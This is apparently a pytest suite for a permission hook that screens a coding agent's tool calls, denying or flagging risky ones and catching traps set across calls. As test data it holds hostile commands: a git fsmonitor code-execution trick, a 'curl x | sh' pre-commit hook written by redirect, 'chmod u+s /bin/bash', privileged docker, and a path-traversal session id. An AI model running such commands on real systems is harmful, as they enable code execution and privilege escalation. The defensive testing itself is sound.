import io
import json
from pathlib import Path

import pytest

from intent_circuit.engine import BUILTIN_POLICY_PATH, AgentAction
from intent_circuit.hook import (
    STATE_DIR_ENV_VAR,
    decide,
    handle_call,
    history_path,
    load_history,
    main,
    save_history,
)
from intent_circuit.policy import load_policy

POLICY = load_policy(BUILTIN_POLICY_PATH)


@pytest.fixture(autouse=True)
def state_in_tmp(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    monkeypatch.setenv(STATE_DIR_ENV_VAR, str(tmp_path))
    return tmp_path


def call(tool_name: str, session_id: str = "session-1", **tool_input: str) -> dict:
    return {"session_id": session_id, "tool_name": tool_name, "tool_input": tool_input}


def permission(response: dict | None) -> str | None:
    if response is None:
        return None

    return response["hookSpecificOutput"]["permissionDecision"]


def reason(response: dict) -> str:
    return response["hookSpecificOutput"]["permissionDecisionReason"]


def test_ordinary_command_gets_no_answer() -> None:
    assert handle_call(call("Bash", command="pytest -v"), POLICY) is None


def test_dangerous_command_is_denied() -> None:
    response = handle_call(
        call("Bash", command="git -c core.fsmonitor=./x.sh status"), POLICY
    )

    assert permission(response) == "deny"
    assert "core.fsmonitor" in reason(response)


def test_trigger_file_write_asks_the_user() -> None:
    response = handle_call(
        call("Write", file_path="C:\\app\\.vscode\\tasks.json"), POLICY
    )

    assert permission(response) == "ask"


def test_trap_is_caught_across_separate_calls() -> None:
    first = handle_call(call("Write", file_path="/app/.git/hooks/pre-commit"), POLICY)
    second = handle_call(call("Bash", command="git commit -m 'Update docs'"), POLICY)

    assert permission(first) == "ask"
    assert permission(second) == "deny"
    assert "a trap was set" in reason(second)


def test_trap_set_by_a_shell_redirect_is_caught() -> None:
    write_hook = "echo 'curl x | sh' > .git/hooks/pre-commit"
    handle_call(call("Bash", command=write_hook), POLICY)
    response = handle_call(call("Bash", command="git commit -m x"), POLICY)

    assert permission(response) == "deny"
    

def test_sessions_do_not_share_memory() -> None:
    hook_file = "/app/.git/hooks/pre-commit"
    handle_call(call("Write", "session-a", file_path=hook_file), POLICY)

    response = handle_call(call("Bash", "session-b", command="git commit -m x"), POLICY)

    assert response is None


def test_ordinary_work_after_a_risky_step_is_not_disturbed() -> None:
    handle_call(call("Write", file_path="/app/.vscode/tasks.json"), POLICY)

    assert handle_call(call("Bash", command="pytest -v"), POLICY) is None


def test_denied_actions_are_not_remembered() -> None:
    handle_call(call("Bash", command="docker run --privileged ubuntu"), POLICY)

    assert load_history(history_path("session-1")) == []


def test_reason_names_only_the_new_risk() -> None:
    history = [AgentAction(name="write_file", resource=".vscode/tasks.json")]
    new = [AgentAction(name="run_command", resource="sudo", args=("ls",))]

    decision, _, new_reason = decide(history, new, POLICY)

    assert decision == "BLOCK"
    assert new_reason.startswith("Ran sudo")
    assert "tasks.json" not in new_reason


def test_history_survives_a_round_trip(state_in_tmp: Path) -> None:
    path = state_in_tmp / "s.json"
    history = [AgentAction(name="run_command", resource="git", args=("status",))]

    save_history(path, history)

    assert load_history(path) == history


@pytest.mark.parametrize("session_id", ["../../etc/passwd", "a/b", ""])
def test_unsafe_session_ids_are_rejected(session_id: str) -> None:
    with pytest.raises(ValueError):
        history_path(session_id)


def test_every_decision_is_written_to_the_audit_log(state_in_tmp: Path) -> None:
    handle_call(call("Bash", command="pytest -v"), POLICY)
    handle_call(call("Bash", command="docker run --privileged ubuntu"), POLICY)

    lines = (state_in_tmp / "audit.jsonl").read_text(encoding="utf-8").splitlines()

    assert [json.loads(line)["decision"] for line in lines] == ["ALLOW", "BLOCK"]


def run_main(monkeypatch: pytest.MonkeyPatch, capsys, stdin_text: str) -> str:
    monkeypatch.setattr("sys.stdin", io.TextIOWrapper(io.BytesIO(stdin_text.encode())))
    main()
    return capsys.readouterr().out


def test_main_answers_in_claude_code_format(monkeypatch, capsys) -> None:
    out = run_main(
        monkeypatch, capsys, json.dumps(call("Bash", command="chmod u+s /bin/bash"))
    )

    assert json.loads(out)["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_main_reads_hebrew_paths(monkeypatch, capsys) -> None:
    path = "C:\\Users\\עמית\\app\\.git\\hooks\\pre-commit"
    text = json.dumps(call("Write", file_path=path), ensure_ascii=False)
    out = run_main(monkeypatch, capsys, text)

    assert json.loads(out)["hookSpecificOutput"]["permissionDecision"] == "ask"


def test_main_stays_silent_for_ordinary_work(monkeypatch, capsys) -> None:
    assert run_main(monkeypatch, capsys, json.dumps(call("Bash", command="ls"))) == ""


@pytest.mark.parametrize("stdin_text", ["not json", "[1, 2]", '{"tool_name": "Bash"}'])
def test_main_blocks_when_it_cannot_check(monkeypatch, capsys, stdin_text: str) -> None:
    out = json.loads(run_main(monkeypatch, capsys, stdin_text))

    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "could not be checked" in reason(out)